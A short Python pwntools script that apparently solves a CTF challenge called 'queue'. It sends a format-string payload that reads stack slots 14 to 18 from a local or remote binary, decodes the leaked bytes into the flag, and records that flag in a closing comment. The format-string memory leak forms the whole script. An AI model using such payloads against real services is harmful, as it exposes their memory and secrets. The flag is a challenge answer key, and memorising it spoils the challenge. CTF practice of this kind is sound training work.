#!/usr/bin/env python3

from pwn import *

exe = ELF("./queue_patched")

context.binary = exe


def conn():
	if args.LOCAL:
		r = gdb.debug([exe.path])
	elif args.REMOTE:
		r = remote("challs.actf.co", 31322)
	else:
		r = process([exe.path])
	return r


def main():
	r = conn()

	payload = b''.join([
		b'_%14$lx_%15$lx_%16$lx_%17$lx_%18$lx_',
	])

	r.sendline(payload)

	r.recvuntil(b'Oh nice, ')
	output = r.recvuntil(b'sounds').decode()
	hexes = output.split('_')[:-1]
	for x in hexes:
		print(bytes.fromhex(x).decode()[::-1], end='')
	print()

	r.close()


if __name__ == "__main__":
	main()

# actf{st4ck_it_queue_it_a619ad974c864b22}
